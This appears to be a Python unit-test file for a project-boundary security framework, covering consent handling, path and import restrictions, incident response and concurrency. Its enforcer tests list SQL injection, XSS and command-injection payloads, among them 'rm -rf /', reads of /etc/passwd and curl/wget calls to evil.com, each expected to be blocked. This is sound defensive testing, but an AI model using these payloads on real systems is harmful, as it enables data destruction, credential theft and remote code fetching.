#!/usr/bin/env python3
"""
Boundary Security Framework - Comprehensive Unit Tests
======================================================

Unit tests covering edge cases, error conditions, and boundary scenarios
for the boundary security framework and project boundary manager.
"""

import unittest
import tempfile
import json
import time
import os
import threading
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
import sys

# Add test directory to path
sys.path.insert(0, str(Path(__file__).parent))

from network_visualizer.boundary_manager import (
    ProjectBoundaryManager, BoundaryViolation, initialize_boundary_manager,
    check_cross_project_import, protected_import
)
from network_visualizer.boundary_security import (
    BoundarySecurityEnforcer, BoundarySecurityAuditor, BoundarySecurityException,
    IncidentResponseHandler, secure_boundary_check
)


class TestBoundaryManagerEdgeCases(unittest.TestCase):
    """Test edge cases for ProjectBoundaryManager"""

    def setUp(self):
        """Set up test fixtures"""
        self.temp_dir = Path(tempfile.mkdtemp())
        self.config_file = self.temp_dir / "boundary_config.json"
        self.manager = ProjectBoundaryManager(self.temp_dir, str(self.config_file))

    def tearDown(self):
        """Clean up test fixtures"""
        if self.config_file.exists():
            self.config_file.unlink()
        self.temp_dir.rmdir()

    def test_empty_project_name_consent(self):
        """Test consent with empty project name"""
        with self.assertRaises(BoundaryViolation):
            self.manager.grant_consent("", "/tmp/test", ["import_access"])

    def test_nonexistent_project_path_consent(self):
        """Test consent with nonexistent project path"""
        with self.assertRaises(BoundaryViolation):
            self.manager.grant_consent("TestProject", "/nonexistent/path", ["import_access"])

    def test_project_path_within_boundary(self):
        """Test consent with project path within current boundary"""
        # Create a path within the boundary
        internal_path = self.temp_dir / "internal"
        internal_path.mkdir()

        with self.assertRaises(BoundaryViolation):
            self.manager.grant_consent("InternalProject", str(internal_path), ["import_access"])

    def test_invalid_permissions_consent(self):
        """Test consent with invalid permissions"""
        external_path = Path(tempfile.mkdtemp()) / "test_invalid"
        external_path.mkdir(parents=True, exist_ok=True)

        try:
            consent_id = self.manager.grant_consent("TestProject", str(external_path), ["invalid_permission"])
            # Should still work but with a warning (permissions are extensible)
            self.assertTrue(consent_id)
            self.assertIsInstance(consent_id, str)
        finally:
            import shutil
            shutil.rmtree(external_path.parent, ignore_errors=True)

    def test_duplicate_consent_ids(self):
        """Test handling of duplicate consent IDs (timing edge case)"""
        external_path = Path("/tmp/duplicate_test")
        external_path.mkdir(exist_ok=True)

        try:
            # Mock time to return same value
            with patch('network_visualizer.boundary_manager.time.time', return_value=1234567890):
                consent1 = self.manager.grant_consent("Project1", str(external_path), ["import_access"])
                consent2 = self.manager.grant_consent("Project2", str(external_path), ["import_access"])

                # Should generate different IDs despite same timestamp
                self.assertNotEqual(consent1, consent2)
        finally:
            external_path.rmdir()

    def test_revoke_nonexistent_consent(self):
        """Test revoking nonexistent consent"""
        result = self.manager.revoke_consent("nonexistent_consent_id")
        self.assertFalse(result)

    def test_malformed_config_file(self):
        """Test loading malformed configuration file"""
        # Write invalid JSON
        self.config_file.write_text("{invalid json")

        # Create new manager (should handle error gracefully)
        manager2 = ProjectBoundaryManager(self.temp_dir, str(self.config_file))

        # Should initialize with empty state
        self.assertEqual(len(manager2.consent_records), 0)
        self.assertEqual(len(manager2.allowed_projects), 0)

    def test_config_file_permission_denied(self):
        """Test handling permission denied on config file"""
        # Make config file read-only
        self.config_file.write_text("{}")
        self.config_file.chmod(0o444)  # Read-only

        # Try to save (should handle gracefully)
        self.manager._save_boundaries()  # Should not raise exception

        # Restore permissions for cleanup
        self.config_file.chmod(0o644)

    def test_boundary_check_unknown_operation(self):
        """Test boundary check with unknown operation type"""
        result = self.manager.check_boundary("unknown_operation", "target")
        self.assertFalse(result)

    def test_boundary_check_with_security_integration(self):
        """Test boundary check with security enforcer integration"""
        # This should work since no consents granted
        result = self.manager.check_boundary("import", "some.module", "test_project")
        self.assertFalse(result)

    def test_get_current_user_fallback(self):
        """Test get_current_user fallback when getpass fails"""
        with patch('network_visualizer.boundary_manager.getpass.getuser', side_effect=OSError):
            user = self.manager._get_current_user()
            self.assertEqual(user, "unknown")


class TestSecurityEnforcerEdgeCases(unittest.TestCase):
    """Test edge cases for BoundarySecurityEnforcer"""

    def setUp(self):
        """Set up test fixtures"""
        self.enforcer = BoundarySecurityEnforcer()

    def test_import_security_module_depth_limit(self):
        """Test module depth limit enforcement"""
        # Create a very deep module path
        deep_module = "a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.x.y.z"
        result = self.enforcer.enforce_import_security(deep_module, "test_project")
        self.assertFalse(result)  # Should be blocked due to depth

    def test_import_security_forbidden_modules(self):
        """Test forbidden module access"""
        forbidden_modules = ["os", "sys", "subprocess", "pickle", "marshal"]

        for module in forbidden_modules:
            with self.subTest(module=module):
                result = self.enforcer.enforce_import_security(f"{module}.something", "test_project")
                self.assertFalse(result, f"Should block {module}")

    def test_path_security_sensitive_files(self):
        """Test sensitive file access detection"""
        sensitive_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "config/secrets.json",
            ".env.production",
            "private/key.pem"
        ]

        for path in sensitive_paths:
            with self.subTest(path=path):
                result = self.enforcer.enforce_path_security(path, "read", "test_project")
                self.assertFalse(result, f"Should block sensitive path: {path}")

    def test_path_security_encoded_traversal(self):
        """Test URL/hex encoded path traversal"""
        encoded_paths = [
            "/valid/path%2e%2e%2fetc%2fpasswd",  # URL encoded ../
            "/valid/path\x2e\x2e/etc/passwd",     # Hex encoded ../
            "C:\\valid\\path\\..\\..\\windows\\system32"
        ]

        for path in encoded_paths:
            with self.subTest(path=path):
                result = self.enforcer.enforce_path_security(path, "read", "test_project")
                self.assertFalse(result, f"Should block encoded traversal: {path}")

    def test_api_security_sql_injection_variants(self):
        """Test various SQL injection patterns"""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users; --",
            "1; EXEC xp_cmdshell 'dir'; --",
            "admin' --",
            "' OR '1'='1",
            "'; WAITFOR DELAY '0:0:5'; --"
        ]

        for payload in sql_payloads:
            with self.subTest(payload=payload):
                result = self.enforcer.enforce_api_security("/api/users", "POST", payload, "test_project")
                self.assertFalse(result, f"Should block SQL injection: {payload}")

    def test_api_security_xss_variants(self):
        """Test various XSS injection patterns"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src='javascript:alert(\"xss\")'>",
            "onmouseover=alert('xss')"
        ]

        for payload in xss_payloads:
            with self.subTest(payload=payload):
                result = self.enforcer.enforce_api_security("/api/content", "POST", payload, "test_project")
                self.assertFalse(result, f"Should block XSS: {payload}")

    def test_api_security_command_injection(self):
        """Test command injection patterns"""
        cmd_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "`whoami`",
            "$(curl http://evil.com)",
            "; wget http://evil.com/malware"
        ]

        for payload in cmd_payloads:
            with self.subTest(payload=payload):
                result = self.enforcer.enforce_api_security("/api/execute", "POST", payload, "test_project")
                self.assertFalse(result, f"Should block command injection: {payload}")

    def test_auditor_risk_assessment_edge_cases(self):
        """Test risk assessment with various threat combinations"""
        auditor = BoundarySecurityAuditor()

        # Test empty threats
        risk = auditor._assess_risk_level([])
        self.assertEqual(risk, "LOW")

        # Test single threat at each level
        threat_levels = {
            "LOW": [{"severity": "LOW"}],
            "MEDIUM": [{"severity": "MEDIUM"}],
            "HIGH": [{"severity": "HIGH"}],
            "CRITICAL": [{"severity": "CRITICAL"}]
        }

        for expected_risk, threats in threat_levels.items():
            with self.subTest(risk=expected_risk):
                calculated_risk = auditor._assess_risk_level(threats)
                self.assertEqual(calculated_risk, expected_risk)

        # Test mixed threats (highest should dominate)
        mixed_threats = [
            {"severity": "LOW"},
            {"severity": "HIGH"},
            {"severity": "MEDIUM"}
        ]
        risk = auditor._assess_risk_level(mixed_threats)
        self.assertEqual(risk, "HIGH")

    def test_auditor_invalid_data_types(self):
        """Test auditor handling of invalid data types"""
        auditor = BoundarySecurityAuditor()

        # Test with non-dict audit results
        with patch.object(auditor, 'audit_import_request', return_value="invalid"):
            # Should handle gracefully
            result = auditor.audit_import_request("test.module", "project")
            self.assertIsInstance(result, str)  # Returns the invalid data


class TestIncidentResponseEdgeCases(unittest.TestCase):
    """Test edge cases for IncidentResponseHandler"""

    def setUp(self):
        """Set up test fixtures"""
        self.handler = IncidentResponseHandler()

    def test_critical_incident_response(self):
        """Test critical incident automated response"""
        # Mock boundary manager for lockdown testing
        with patch('network_visualizer.boundary_security.boundary_manager') as mock_bm:
            mock_bm.emergency_lockdown.return_value = 5

            self.handler.handle_security_incident(
                "critical_attack", {"details": "test"}, "CRITICAL"
            )

            # Should have triggered lockdown
            mock_bm.emergency_lockdown.assert_called_once()

    def test_high_severity_incident_response(self):
        """Test high severity incident response"""
        with patch('network_visualizer.boundary_security.boundary_manager') as mock_bm:
            mock_bm.allowed_projects = {"test_project"}
            mock_bm.consent_records = {"consent_123": {"project_name": "test_project"}}

            self.handler.handle_security_incident(
                "high_risk_import", {"project_name": "test_project"}, "HIGH"
            )

            # Should attempt to revoke related consents
            # (Note: actual revocation logic is complex, just testing call)

    def test_concurrent_incident_handling(self):
        """Test concurrent incident handling"""
        incidents = []
        errors = []

        def create_incident(incident_id):
            try:
                self.handler.handle_security_incident(
                    f"concurrent_incident_{incident_id}",
                    {"test": "data"},
                    "MEDIUM"
                )
                incidents.append(incident_id)
            except Exception as e:
                errors.append(str(e))

        # Create multiple concurrent incidents
        threads = []
        for i in range(10):
            t = threading.Thread(target=create_incident, args=(i,))
            threads.append(t)
            t.start()

        # Wait for completion
        for t in threads:
            t.join(timeout=5)

        # Should handle all incidents without errors
        self.assertEqual(len(incidents), 10)
        self.assertEqual(len(errors), 0)
        self.assertEqual(len(self.handler.incident_log), 10)


class TestConfigurationPersistenceEdgeCases(unittest.TestCase):
    """Test configuration persistence edge cases"""

    def setUp(self):
        """Set up test fixtures"""
        self.temp_dir = Path(tempfile.mkdtemp())

    def tearDown(self):
        """Clean up test fixtures"""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_config_file_corruption_recovery(self):
        """Test recovery from corrupted configuration"""
        config_file = self.temp_dir / "corrupted_config.json"

        # Create corrupted config
        config_file.write_text('{"incomplete": json}')

        manager = ProjectBoundaryManager(self.temp_dir, str(config_file))

        # Should initialize empty despite corruption
        self.assertEqual(len(manager.consent_records), 0)

        # Should be able to save new config
        manager._save_boundaries()
        self.assertTrue(config_file.exists())

        # Should be able to load the new config
        manager2 = ProjectBoundaryManager(self.temp_dir, str(config_file))
        self.assertEqual(len(manager2.consent_records), 0)

    def test_atomic_config_writes(self):
        """Test atomic configuration file writes"""
        config_file = self.temp_dir / "atomic_config.json"

        manager = ProjectBoundaryManager(self.temp_dir, str(config_file))

        # Simulate concurrent writes
        def write_config(manager, data):
            manager.consent_records.update(data)
            manager._save_boundaries()

        # Start multiple concurrent writes
        threads = []
        for i in range(5):
            data = {f"consent_{i}": {"test": f"data_{i}"}}
            t = threading.Thread(target=write_config, args=(manager, data))
            threads.append(t)
            t.start()

        for t in threads:
            t.join(timeout=5)

        # Config should be in valid state
        manager3 = ProjectBoundaryManager(self.temp_dir, str(config_file))
        # Should have some data (exact amount depends on timing)
        self.assertIsInstance(manager3.consent_records, dict)

    def test_config_file_permissions_edge_cases(self):
        """Test various file permission scenarios"""
        config_file = self.temp_dir / "perm_config.json"

        # Test with no write permissions on directory
        self.temp_dir.chmod(0o555)  # Read and execute only

        manager = ProjectBoundaryManager(self.temp_dir, str(config_file))
        # Should handle gracefully
        manager._save_boundaries()  # Should not crash

        # Restore permissions
        self.temp_dir.chmod(0o755)


class TestConcurrentAccessEdgeCases(unittest.TestCase):
    """Test concurrent access edge cases"""

    def setUp(self):
        """Set up test fixtures"""
        self.temp_dir = Path(tempfile.mkdtemp())
        self.config_file = self.temp_dir / "concurrent_config.json"
        self.manager = ProjectBoundaryManager(self.temp_dir, str(self.config_file))

    def tearDown(self):
        """Clean up test fixtures"""
        if self.config_file.exists():
            self.config_file.unlink()
        self.temp_dir.rmdir()

    def test_concurrent_consent_granting(self):
        """Test concurrent consent granting"""
        external_path = Path(tempfile.mkdtemp()) / "concurrent_test"
        external_path.mkdir(parents=True, exist_ok=True)

        results = []
        errors = []

        def grant_consent_thread(thread_id):
            try:
                consent_id = self.manager.grant_consent(
                    f"Project{thread_id}",
                    str(external_path),
                    ["import_access"],
                    f"Thread {thread_id}"
                )
                results.append(consent_id)
            except Exception as e:
                errors.append(str(e))

        # Start concurrent consent granting
        threads = []
        for i in range(10):
            t = threading.Thread(target=grant_consent_thread, args=(i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join(timeout=10)

        # Should have 10 successful consents
        self.assertEqual(len(results), 10)
        self.assertEqual(len(errors), 0)

        # All consent IDs should be unique
        self.assertEqual(len(set(results)), 10)

        # Cleanup
        import shutil
        shutil.rmtree(external_path.parent, ignore_errors=True)

    def test_concurrent_boundary_checks(self):
        """Test concurrent boundary checks"""
        results = []
        errors = []

        def boundary_check_thread(thread_id):
            try:
                result = self.manager.check_boundary(
                    "import",
                    f"test.module{thread_id}",
                    f"project{thread_id}"
                )
                results.append(result)
            except Exception as e:
                errors.append(str(e))

        # Start concurrent boundary checks
        threads = []
        for i in range(20):
            t = threading.Thread(target=boundary_check_thread, args=(i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join(timeout=10)

        # Should handle all checks without errors
        self.assertEqual(len(results), 20)
        self.assertEqual(len(errors), 0)

        # All should return False (no consents granted)
        self.assertTrue(all(not result for result in results))


class TestErrorHandlingRecovery(unittest.TestCase):
    """Test error handling and recovery scenarios"""

    def test_security_enforcer_exception_handling(self):
        """Test security enforcer exception handling"""
        enforcer = BoundarySecurityEnforcer()

        # Test with invalid inputs - should handle gracefully
        result = enforcer.enforce_import_security("", "project")  # Empty module
        self.assertFalse(result)  # Should handle gracefully

        result = enforcer.enforce_path_security("", "read", "project")  # Empty path
        self.assertFalse(result)  # Should handle gracefully

        result = enforcer.enforce_api_security("/api", "GET", "", "project")  # Empty data
        self.assertTrue(result)  # Should allow empty data

    def test_boundary_manager_exception_recovery(self):
        """Test boundary manager exception recovery"""
        temp_dir = Path(tempfile.mkdtemp())
        config_file = temp_dir / "error_config.json"

        try:
            manager = ProjectBoundaryManager(temp_dir, str(config_file))

            # Test with invalid consent data - should handle hash generation gracefully
            with patch.object(manager, '_generate_consent_hash', return_value="test_hash"):
                # Create a valid external path for testing
                external_path = Path(tempfile.mkdtemp()) / "test_external"
                external_path.mkdir(parents=True, exist_ok=True)

                try:
                    consent_id = manager.grant_consent("Test", str(external_path), ["import_access"])
                    self.assertIsNotNone(consent_id)
                finally:
                    import shutil
                    shutil.rmtree(external_path.parent, ignore_errors=True)

        finally:
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)

    def test_global_functions_error_handling(self):
        """Test global boundary functions error handling"""
        # Test with uninitialized boundary manager
        with patch('network_visualizer.boundary_manager.boundary_manager', None):
            result = check_cross_project_import("test.module")
            self.assertFalse(result)  # Should deny when no boundary manager (secure by default)

        # Test protected import with boundary violation
        with self.assertRaises(BoundaryViolation):
            with patch('network_visualizer.boundary_manager.check_cross_project_import', return_value=False):
                protected_import("blocked.module")


class TestIntegrationEdgeCases(unittest.TestCase):
    """Test integration edge cases between components"""

    def test_boundary_security_integration_workflow(self):
        """Test complete workflow integration"""
        temp_dir = Path(tempfile.mkdtemp())
        config_file = temp_dir / "integration_config.json"

        try:
            # Create boundary manager
            manager = ProjectBoundaryManager(temp_dir, str(config_file))

            # Grant consent
            external_path = Path(tempfile.mkdtemp()) / "integration_test"
            external_path.mkdir(parents=True, exist_ok=True)

            try:
                consent_id = manager.grant_consent(
                    "IntegrationTest",
                    str(external_path),
                    ["import_access", "path_access"]
                )

                # Test boundary check (should pass basic check)
                result = manager.check_boundary("import", "integration.test.module", "IntegrationTest")
                self.assertTrue(result)  # Should pass basic boundary check

                # Test security check (should be validated)
                safe_file = external_path / "safe_file.txt"
                safe_file.write_text("test")
                result = manager.check_boundary("path_access", str(safe_file), "IntegrationTest")
                self.assertTrue(result)  # Should pass security validation

                # Test blocking malicious access
                result = manager.check_boundary("import", "os.system", "MaliciousProject")
                self.assertFalse(result)  # Should be blocked by security

                # Revoke consent
                revoked = manager.revoke_consent(consent_id)
                self.assertTrue(revoked)

                # Test access after revocation
                result = manager.check_boundary("import", "integration.test.module", "IntegrationTest")
                self.assertFalse(result)  # Should be blocked after revocation

            finally:
                import shutil
                shutil.rmtree(external_path.parent, ignore_errors=True)

        finally:
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)


def run_edge_case_tests():
    """Run all edge case tests"""
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    # Add all test classes
    test_classes = [
        TestBoundaryManagerEdgeCases,
        TestSecurityEnforcerEdgeCases,
        TestIncidentResponseEdgeCases,
        TestConfigurationPersistenceEdgeCases,
        TestConcurrentAccessEdgeCases,
        TestErrorHandlingRecovery,
        TestIntegrationEdgeCases
    ]

    for test_class in test_classes:
        suite.addTests(loader.loadTestsFromTestCase(test_class))

    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    return result.wasSuccessful()


if __name__ == "__main__":
    print("🧪 Boundary Security Framework - Edge Case Unit Tests")
    print("=" * 60)

    success = run_edge_case_tests()

    if success:
        print("\n✅ All edge case tests passed!")
        sys.exit(0)
    else:
        print("\n❌ Some edge case tests failed!")
        sys.exit(1)
